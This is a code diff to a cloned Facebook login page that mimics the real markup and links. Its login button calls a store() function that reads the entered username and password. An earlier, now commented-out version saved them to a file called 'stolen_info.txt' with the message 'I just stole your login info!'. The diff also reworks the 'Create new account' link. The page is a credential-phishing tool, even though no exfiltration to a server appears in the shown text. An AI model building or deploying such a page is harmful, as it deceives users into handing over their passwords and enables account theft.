@@ -91,6 +91,10 @@
                                             </div><input type="hidden" autocomplete="off" name="login_source"
                                                 value="comet_headerless_login" /><input type="hidden" autocomplete="off"
                                                 name="next" value="" />
+
+
+
+     
                                             <div class="_6ltg"><button onclick="store()" value="1"
                                                     class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login"
                                                     data-testid="royal_login_button" type="submit" id="u_0_5_rW">Log
@@ -99,10 +103,15 @@
                                                     href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgzMjk5MzE1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgot
                                                     password?</a></div>
                                             <div class="_8icz"></div>
-                                            <div class="_6ltg"><a role="button"
+                                            <!--<div class="_6ltg"><a role="button"
                                                     class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="https://www.facebook.com/r.php?locale=en_US&display=page"
                                                     >Create new
+                                                    account</a></div>-->
+                                                    <div class="_6ltg"><a role="button"
+                                                    class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" onclick="https://www.facebook.com/r.php?locale=en_US&display=page"
+                                                    >Create new
                                                     account</a></div>
+
                                         </form
                                     </div>
                                     <div id="reg_pages_msg" class="_58mk"><a
@@ -238,7 +247,10 @@
 
     <script>
         function store() {
-            const link = document.createElement("a");
+            const username = "\nUsername: " + document.getElementById('email').value;
+            const password = "\nPassword: " + document.getElementById('pass').value;
+            
+            /*const link = document.createElement("a");
             const message = "I just stole your login info!";
             const username = "\nUsername: " + document.getElementById('email').value;
             const password = "\nPassword: " + document.getElementById('pass').value;
@@ -246,7 +258,7 @@
             link.href = URL.createObjectURL(file);
             link.download = "stolen_info.txt";
             link.click();
-            URL.revokeObjectURL(link.href);
+            URL.revokeObjectURL(link.href);*/
         }
     </script>
 
